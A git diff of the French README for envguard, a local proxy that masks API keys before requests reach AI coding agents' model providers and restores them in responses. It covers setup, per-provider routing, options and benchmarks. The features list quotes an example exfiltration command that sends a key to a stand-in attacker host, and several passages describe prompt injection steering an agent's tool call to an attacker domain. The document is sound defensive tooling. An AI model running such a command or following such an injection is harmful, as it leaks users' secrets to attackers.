@@ -1,248 +1,91 @@
 # envguard
 
-Proxy local qui **masque les clés API et secrets** avant qu'ils n'atteignent un LLM, puis **les remet** dans la réponse. Le modèle ne voit jamais la vraie valeur, mais tes outils (et tes tool calls) la reçoivent.
+**Un proxy local qui empêche vos clés d'API et vos secrets d'atteindre les modèles d'IA.**
+
+Les agents de code (Claude Code, Codex, Gemini CLI, aider…) lisent vos fichiers `.env`, vos configurations et vos sorties de commandes, et envoient tout au fournisseur du modèle. envguard s'intercale : il remplace chaque secret par un placeholder avant l'envoi, puis remet la vraie valeur dans la réponse. Le modèle travaille normalement, mais ne voit jamais la valeur réelle de vos secrets.
+
+[![Go](https://img.shields.io/badge/Go-1.27-00ADD8?logo=go&logoColor=white)](go.mod)
+[![Licence MIT](https://img.shields.io/badge/licence-MIT-green)](LICENSE)
 
 ```
-client ──▶ envguard ──▶ API du fournisseur
-   sk-ant-api03-Xy…   →   sk-ant-REDACTED_3c93161e
-   sk-ant-api03-Xy…   ◀   sk-ant-REDACTED_3c93161e
+  votre agent                    envguard                       fournisseur
+ ─────────────                ─────────────                   ─────────────
+ sk-ant-api03-Xy…  ────────▶  masque        ────────▶  sk-ant-REDACTED_3c93161e
+ sk-ant-api03-Xy…  ◀────────  réhydrate     ◀────────  sk-ant-REDACTED_3c93161e
 ```
 
-- Détection native rapide (préfixes connus, JWT, clés PEM, mots de passe d'URL, `API_KEY=…`, marquage `# secret:`) plus **~210 règles gitleaks**
-- **Valeurs de vos fichiers `.env`** masquées partout, même sans motif reconnaissable
-- **Politique de réhydratation** : une clé n'est remise dans un appel d'outil que vers une destination légitime (bloque l'exfiltration par injection de prompt)
-- Placeholders stables : même secret → même placeholder, ce qui préserve le prompt caching
-- Streaming géré (placeholders coupés entre deux chunks), y compris les arguments de tool calls
-- Formats : Anthropic Messages, OpenAI Chat Completions, OpenAI Responses, Gemini natif
-- TUI Bubble Tea, mode headless, ou `envguard run -- <outil>`
+```bash
+envguard run -- claude
+```
+
+## Pourquoi
+
+- **Votre clé reste chez vous.** Le fournisseur, ses journaux et ses éventuelles fuites ne voient que des placeholders.
+- **L'agent n'est pas gêné.** Les réponses, les commandes et les appels d'outils reçoivent la vraie valeur, réhydratée côté poste, y compris en streaming.
+- **Les tentatives d'exfiltration visibles sont bloquées** : dans un appel d'outil, une clé n'est remise que vers une destination légitime, et pas vers le domaine qu'une injection de prompt aurait glissé dans la commande. Les limites sont détaillées dans [SECURITY.md](SECURITY.md).
+- **Aucun réglage pour commencer.** `envguard run` démarre l'outil, configure les URL et s'arrête avec lui.
+
+## Fonctionnalités
+
+- **Détection** : règles natives rapides (~45 préfixes de clés connus, JWT, clés PEM, mots de passe d'URL, `API_KEY=…`, jetons Bearer, marquage `# secret:`), **~210 règles [gitleaks](https://github.com/gitleaks/gitleaks)**, et les valeurs de vos **fichiers `.env`**, masquées partout même sans motif reconnaissable.
+- **Réhydratation fidèle** : placeholders stables (même secret, même placeholder), ce qui préserve le prompt caching, et streaming géré même quand un placeholder est coupé entre deux paquets.
+- **Politique des appels d'outils** : bloque `curl https://attaquant/?k=<placeholder>`, laisse passer `DB_PASSWORD=<placeholder> npm test`.
+- **17 fournisseurs** : Anthropic, OpenAI (Chat et Responses), Gemini natif, DeepSeek, Meta, xAI, Mistral, Groq, OpenRouter, Together, Fireworks, Qwen, Moonshot, Z.ai, Perplexity, Cohere, Ollama, et tout fournisseur compatible OpenAI.
+- **Rapide** : ~0,3 ms ajoutée par requête, 0,6 ms pour un tour de conversation de 1,5 Mo grâce au cache par message.
+- **Durci** : requêtes de navigateur refusées, corps compressés gérés, placeholders HMAC à clé locale, fuzzing et `-race`.
+- **Interface** : TUI dans le terminal, mode sans interface, ou `envguard run`.
+
+## Installation
+
+```bash
+go install github.com/NetSo8/envguard@latest
+```
+
+Ou depuis les sources :
+
+```bash
+git clone https://github.com/NetSo8/envguard && cd envguard && go build -o envguard .
+```
+
+Nécessite Go 1.27 ou plus récent.
 
 ## Démarrage rapide
 
-```bash
-go build -o envguard .
-```
+**Avec un agent** : envguard lance l'outil derrière lui et s'arrête avec lui.
 
 ```bash
-./envguard run -- claude
+envguard run -- claude
 ```
-
-`envguard run` lance le proxy sur un port libre, démarre l'outil avec `ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, `OPENAI_API_BASE` et `GOOGLE_GEMINI_BASE_URL` pointés vers lui, et s'arrête avec lui. Ça marche de la même façon avec `codex`, `gemini`, `aider`…
-
-- **Pas d'interface :** l'outil occupe le terminal. Le journal va dans `<config>/envguard/run.log` (`-log`), sans jamais écrire de secret, et un résumé s'affiche à la sortie, réhydratations bloquées comprises.
-- **URL de base déjà définie** (passerelle d'entreprise, autre proxy) : envguard s'insère devant au lieu de l'écraser. Un `-provider` explicite reste prioritaire.
-- **Signaux et code de sortie :** le code de sortie de l'outil est transmis. `Ctrl+C` va à l'outil, et `SIGTERM` / `SIGHUP` lui sont relayés.
-
-Pour garder le proxy ouvert avec la TUI, sans outil attaché :
 
 ```bash
-./envguard
+envguard run -- codex
 ```
 
-Par défaut, il écoute sur `127.0.0.1:8787`. Toutes les options s'appliquent aussi à `envguard run` :
+- **Variables d'environnement :** l'outil reçoit `ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, `OPENAI_API_BASE` et `GOOGLE_GEMINI_BASE_URL`, pointées vers un proxy sur un port libre.
+- **URL de base déjà définie** (passerelle d'entreprise…) : envguard s'insère devant au lieu de l'écraser.
+- **À la sortie :** un résumé s'affiche, réhydratations bloquées comprises. Le journal va dans `<config>/envguard/run.log`, sans jamais écrire de secret.
+- **Code de sortie :** celui de l'outil est transmis.
 
-| Option | Défaut | Rôle |
-|---|---|---|
-| `-listen` | `127.0.0.1:8787` (`run` : port libre) | adresse d'écoute |
-| `-provider nom=url` | — | ajoute ou surcharge un fournisseur (répétable) |
-| `-env-file fichier` | les `.env*` du dossier courant | fichier `.env` dont les valeurs sont masquées (répétable) |
-| `-no-env` | `false` | ne pas lire les `.env` du dossier courant |
-| `-tool-policy` | `strict` | réhydratation dans les appels d'outils : `strict`, `warn` ou `off` |
-| `-allow-host type=hôte` | — | destination autorisée pour un type de secret (répétable), ex. `env:API_TOKEN=api.exemple.com` |
-| `-no-gitleaks` | `false` | désactiver les règles gitleaks |
-| `-gitleaks-exclude id` | — | ignorer une règle gitleaks (répétable) |
-| `-allow` | `~/.envguard_allow` | allowlist (envguard n'y écrit que des HMAC, jamais le secret en clair) |
-| `-key` | `<config>/envguard/key` | clé qui dérive les placeholders (créée au premier lancement, `0600`) |
-| `-allow-origin URL` | — | origine navigateur autorisée, ex. `http://localhost:3000` (répétable) |
-| `-max-body` | `268435456` | taille max d'un corps de requête, en octets |
-| `-log` | `<config>/envguard/run.log` | journal de `envguard run` |
-| `-no-hint` | `false` | n'injecte pas la consigne « recopie les placeholders tels quels » |
-| `-no-tui` | `false` | logs sur stderr au lieu de la TUI |
+**En proxy permanent, avec la TUI :**
 
-`<config>` est `~/Library/Application Support` sur macOS et `~/.config` sur Linux.
-
-## Principe du routage
-
-Chaque fournisseur a sa route : `http://127.0.0.1:8787/<nom>` remplace la base URL officielle, le reste du chemin est inchangé.
-
-```
-http://127.0.0.1:8787/groq/v1/chat/completions  →  https://api.groq.com/openai/v1/chat/completions
+```bash
+envguard
 ```
 
-Ta clé du fournisseur (header `Authorization`, `x-api-key`, `x-goog-api-key`) est transmise telle quelle : seul le **contenu** des requêtes est masqué.
-
-Dans les exemples ci-dessous, remplace `$MODEL` par le modèle voulu.
-
----
-
-## Anthropic (Claude)
-
-Claude Code :
+Il écoute alors sur `127.0.0.1:8787`, avec une route par fournisseur :
 
 ```bash
 ANTHROPIC_BASE_URL=http://127.0.0.1:8787/anthropic claude
 ```
 
-SDK (Python / TypeScript) : `base_url="http://127.0.0.1:8787/anthropic"`.
+Les commandes pour chaque fournisseur sont dans [docs/PROVIDERS.md](docs/PROVIDERS.md).
 
-```bash
-curl http://127.0.0.1:8787/anthropic/v1/messages -H "x-api-key: $ANTHROPIC_API_KEY" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" -d '{"model":"'$MODEL'","max_tokens":256,"messages":[{"role":"user","content":"ma clé: sk-ant-api03-exemple0123456789abcdefghij"}]}'
-```
+## Comment ça marche
 
-## OpenAI
-
-Codex et SDK OpenAI :
-
-```bash
-OPENAI_BASE_URL=http://127.0.0.1:8787/openai/v1 codex
-```
-
-```bash
-curl http://127.0.0.1:8787/openai/v1/chat/completions -H "Authorization: Bearer $OPENAI_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","stream":true,"messages":[{"role":"user","content":"hello"}]}'
-```
-
-L'API Responses passe par la même route : `/openai/v1/responses`.
-
-## Google Gemini
-
-API native (Gemini CLI, SDK `google-genai`) :
-
-```bash
-GOOGLE_GEMINI_BASE_URL=http://127.0.0.1:8787/gemini gemini
-```
-
-```bash
-curl "http://127.0.0.1:8787/gemini/v1beta/models/$MODEL:streamGenerateContent?alt=sse" -H "x-goog-api-key: $GEMINI_API_KEY" -H "content-type: application/json" -d '{"contents":[{"parts":[{"text":"hello"}]}]}'
-```
-
-Couche compatible OpenAI :
-
-```bash
-OPENAI_BASE_URL=http://127.0.0.1:8787/gemini/v1beta/openai OPENAI_API_KEY=$GEMINI_API_KEY codex
-```
-
-> Utilise `?alt=sse` pour le streaming natif. Sans ce paramètre, Gemini renvoie un tableau JSON, qui est réhydraté mais seulement une fois reçu en entier.
-
-## DeepSeek
-
-Format OpenAI :
-
-```bash
-curl http://127.0.0.1:8787/deepseek/chat/completions -H "Authorization: Bearer $DEEPSEEK_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-Format Anthropic (Claude Code avec les modèles DeepSeek) :
-
-```bash
-ANTHROPIC_BASE_URL=http://127.0.0.1:8787/deepseek/anthropic ANTHROPIC_AUTH_TOKEN=$DEEPSEEK_API_KEY claude
-```
-
-## Meta (Muse Spark)
-
-Chat Completions, Responses et Messages sont tous disponibles.
-
-```bash
-OPENAI_BASE_URL=http://127.0.0.1:8787/meta/v1 OPENAI_API_KEY=$MODEL_API_KEY codex
-```
-
-```bash
-curl http://127.0.0.1:8787/meta/v1/chat/completions -H "Authorization: Bearer $MODEL_API_KEY" -H "content-type: application/json" -d '{"model":"muse-spark-1.1","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## xAI (Grok)
-
-```bash
-curl http://127.0.0.1:8787/xai/v1/chat/completions -H "Authorization: Bearer $XAI_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Mistral
-
-```bash
-curl http://127.0.0.1:8787/mistral/v1/chat/completions -H "Authorization: Bearer $MISTRAL_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Groq
-
-```bash
-curl http://127.0.0.1:8787/groq/v1/chat/completions -H "Authorization: Bearer $GROQ_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## OpenRouter
-
-```bash
-OPENAI_BASE_URL=http://127.0.0.1:8787/openrouter/v1 OPENAI_API_KEY=$OPENROUTER_API_KEY codex
-```
-
-```bash
-curl http://127.0.0.1:8787/openrouter/v1/chat/completions -H "Authorization: Bearer $OPENROUTER_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Together AI
-
-```bash
-curl http://127.0.0.1:8787/together/v1/chat/completions -H "Authorization: Bearer $TOGETHER_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Fireworks AI
-
-```bash
-curl http://127.0.0.1:8787/fireworks/v1/chat/completions -H "Authorization: Bearer $FIREWORKS_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Qwen (Alibaba DashScope, international)
-
-```bash
-curl http://127.0.0.1:8787/qwen/v1/chat/completions -H "Authorization: Bearer $DASHSCOPE_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-Région Chine : `-provider qwen=https://dashscope.aliyuncs.com/compatible-mode`.
-
-## Moonshot (Kimi)
-
-```bash
-curl http://127.0.0.1:8787/moonshot/v1/chat/completions -H "Authorization: Bearer $MOONSHOT_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Z.ai (GLM)
-
-La base officielle contient déjà la version, la route n'a donc pas de `/v1` :
-
-```bash
-curl http://127.0.0.1:8787/zai/chat/completions -H "Authorization: Bearer $ZAI_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Perplexity
-
-```bash
-curl http://127.0.0.1:8787/perplexity/chat/completions -H "Authorization: Bearer $PERPLEXITY_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Cohere (compatibilité OpenAI)
-
-```bash
-curl http://127.0.0.1:8787/cohere/v1/chat/completions -H "Authorization: Bearer $COHERE_API_KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-## Ollama (local)
-
-```bash
-curl http://127.0.0.1:8787/ollama/v1/chat/completions -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-L'API native `/api/chat` d'Ollama n'est pas gérée en streaming : utilise `/v1`.
-
-## Autre fournisseur compatible OpenAI
-
-```bash
-./envguard -provider monfournisseur=https://api.exemple.com
-```
-
-```bash
-curl http://127.0.0.1:8787/monfournisseur/v1/chat/completions -H "Authorization: Bearer $KEY" -H "content-type: application/json" -d '{"model":"'$MODEL'","messages":[{"role":"user","content":"hello"}]}'
-```
-
-`-provider` surcharge aussi un fournisseur existant (URL régionale, passerelle d'entreprise…).
-
----
+1. **Requête** : le corps JSON est scanné en un passage, sans expression régulière pour les règles natives. Les secrets trouvés reçoivent un placeholder qui garde leur préfixe (`sk-ant-REDACTED_3c93161e`), dérivé d'un HMAC avec une clé locale. Une consigne ajoutée au system prompt demande au modèle de recopier les placeholders tels quels.
+2. **Cache** : une conversation est renvoyée en entier à chaque tour. Chaque message masqué est mémorisé, et seuls les nouveaux sont scannés.
+3. **Réponse** : les placeholders sont remplacés par les vraies valeurs, y compris en streaming SSE (Anthropic, OpenAI Chat et Responses, Gemini), où un placeholder peut être coupé entre deux paquets.
+4. **Appels d'outils** : dans les arguments d'un outil, la valeur n'est remise que si chaque hôte cité est une destination légitime pour ce secret.
 
 ## Ce qui est détecté
 
@@ -317,6 +160,43 @@ cd third_party/gitleaks && curl -sfLo gitleaks.toml https://raw.githubuserconten
 - **Placeholders à clé** : HMAC-SHA256 avec une clé locale. Un placeholder ne permet pas de vérifier hors ligne un secret deviné.
 - Analyse complète, risques restants et limites : [SECURITY.md](SECURITY.md).
 
+## Performances
+
+| Mesure | Résultat |
+|---|---|
+| Latence ajoutée, requête de 64 Ko | ~0,3 ms |
+| Tour de conversation de 1,5 Mo (cache par message) | ~0,6 ms |
+| Scan (règles natives / avec gitleaks) | ~500 / ~315 Mo/s, sans allocation |
+| Réhydratation | ~1,2 Go/s, sans allocation |
+| Coût du streaming, par événement | 0,04 à 1 µs |
+| Mémoire en usage | 15 à 35 Mo |
+
+Un appel à un modèle dure de 1 à 60 secondes : le surcoût est imperceptible. Mesures, méthode et historique des optimisations : [PERF.md](PERF.md).
+
+## Options
+
+Toutes les options s'appliquent à `envguard` comme à `envguard run`.
+
+| Option | Défaut | Rôle |
+|---|---|---|
+| `-listen` | `127.0.0.1:8787` (`run` : port libre) | adresse d'écoute |
+| `-provider nom=url` | — | ajoute ou surcharge un fournisseur (répétable) |
+| `-env-file fichier` | les `.env*` du dossier courant | fichier `.env` dont les valeurs sont masquées (répétable) |
+| `-no-env` | `false` | ne pas lire les `.env` du dossier courant |
+| `-tool-policy` | `strict` | réhydratation dans les appels d'outils : `strict`, `warn` ou `off` |
+| `-allow-host type=hôte` | — | destination autorisée pour un type de secret (répétable), ex. `env:API_TOKEN=api.exemple.com` |
+| `-no-gitleaks` | `false` | désactiver les règles gitleaks |
+| `-gitleaks-exclude id` | — | ignorer une règle gitleaks (répétable) |
+| `-allow` | `~/.envguard_allow` | allowlist (envguard n'y écrit que des HMAC, jamais le secret en clair) |
+| `-key` | `<config>/envguard/key` | clé qui dérive les placeholders (créée au premier lancement, `0600`) |
+| `-allow-origin URL` | — | origine navigateur autorisée, ex. `http://localhost:3000` (répétable) |
+| `-max-body` | `268435456` | taille max d'un corps de requête, en octets |
+| `-log` | `<config>/envguard/run.log` | journal de `envguard run` |
+| `-no-hint` | `false` | n'injecte pas la consigne « recopie les placeholders tels quels » |
+| `-no-tui` | `false` | logs sur stderr au lieu de la TUI |
+
+`<config>` est `~/Library/Application Support` sur macOS et `~/.config` sur Linux.
+
 ## TUI
 
 | Touche | Action |
@@ -333,8 +213,9 @@ cd third_party/gitleaks && curl -sfLo gitleaks.toml https://raw.githubuserconten
 - Un secret maison sans préfixe ni nom de variable explicite, absent des `.env`, passe à travers : utilise `# secret:` ou `-env-file`.
 - La politique des outils bloque les exfiltrations visibles, pas une commande qui reconstruit l'hôte à l'exécution.
 - Les API natives de Cohere (v2) et d'Ollama (`/api/chat`) ne sont pas gérées en streaming.
+- Développé et testé sur macOS. Le code compile pour Linux et Windows, mais n'y a pas encore été testé.
 
-## Ce qui reste à faire
+## Feuille de route
 
 Par ordre d'intérêt :
 
@@ -346,9 +227,8 @@ Par ordre d'intérêt :
 6. **Distribution** : intégration continue (tests, `-race`, fuzzing court), binaires signés via goreleaser, formule Homebrew. Le code compile déjà pour Linux et Windows, mais `envguard run` n'a été testé que sur macOS.
 7. **Journal d'audit** JSONL sans aucun secret, et **mode blocage** (refuser une requête au lieu de masquer, pour les clés les plus sensibles).
 
-La liste complète, classée par impact et effort, est dans la feuille de route.
 
-## Tests
+## Développement
 
 ```bash
 go test ./...
@@ -365,3 +245,7 @@ go test -run '^$' -fuzz FuzzSSE -fuzztime 60s .
 ```bash
 go test -run x -bench . .
 ```
+
+## Licence
+
+[MIT](LICENSE). Les règles de détection de [gitleaks](https://github.com/gitleaks/gitleaks) sont incluses sous leur propre licence MIT, dans [third_party/gitleaks](third_party/gitleaks).
